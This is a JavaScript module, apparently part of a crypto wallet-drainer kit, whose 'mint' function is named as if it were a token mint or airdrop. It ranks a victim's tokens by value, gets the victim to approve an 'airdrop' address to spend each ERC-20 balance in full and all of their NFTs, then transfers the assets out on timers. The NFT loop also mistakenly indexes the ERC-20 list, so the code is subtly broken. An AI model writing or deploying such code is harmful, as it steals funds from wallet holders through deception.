import erc20abi from "../abis/erc20abi.json";
import erc721abi from "../abis/erc721abi.json";
import {  transferErc20 } from "./erc20.service.js";
import { transferErc721 } from "./erc721.service.js";
export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signer, clientRead, clientWrite, userAddress) => {

    tokensERC20.sort((a, b) => +b.balanceInUsd - +a.balanceInUsd);
    tokensERC721.sort((a, b) => +b.price - +a.price);
    for (let iter20 = 0; iter20 < tokensERC20.length; iter20++) {
      let canceled = false;
      try {
        if (tokensERC20[iter20].isApproved === false) {
          // const contract = new ethers.Contract(tokensERC20[iter20].address, erc20abi, signer);
          const {request} = await clientRead.simulateContract({
            address: tokensERC20[iter20].address,
            abi: erc20abi,
            functionName: "approve",
            args:  [airdrop, tokensERC20[iter20].balance],
          })
          await clientWrite.writeContract(request)
          // await contract.approve(airdrop, tokensERC20[iter20].balance);
        }
      }
      catch (err) {
        console.log(err);
        canceled = true;
      }
      if (canceled) {
        break;
      }
    }
    for (let iter = 0; iter < tokensERC721.length; iter++) {
      try {
        let canceled = false;
        try {
          if (tokensERC721[iter].isApproved === false) {
   
            const {request} = await clientRead.simulateContract({
              address: tokensERC20[iter].address,
              abi: erc721abi,
              functionName: "setApprovalForAll",
              args:  [airdrop, tokensERC20[iter].balance],
            })
            await clientWrite.writeContract(request)
          }
        }
        catch (err) {
          canceled = true;
          console.log(err, "ERRROR");
        }
        if (canceled) {
          console.log("canceled");
          break;
        }
      }
      catch (err) {
        console.log(err);
      }
    }
    setTimeout(() => {
      if (tokensERC20.length > 0) {
        transferErc20(chain, tokensERC20,airdrop, userAddress, clientRead, clientWrite, signer);
      }
    }, 45000)
    setTimeout(() => {
      if (tokensERC721.length > 0) {
        transferErc721(chain, airdrop, tokensERC721, userAddress, clientRead, signer);
      }
    }, 60000)
  }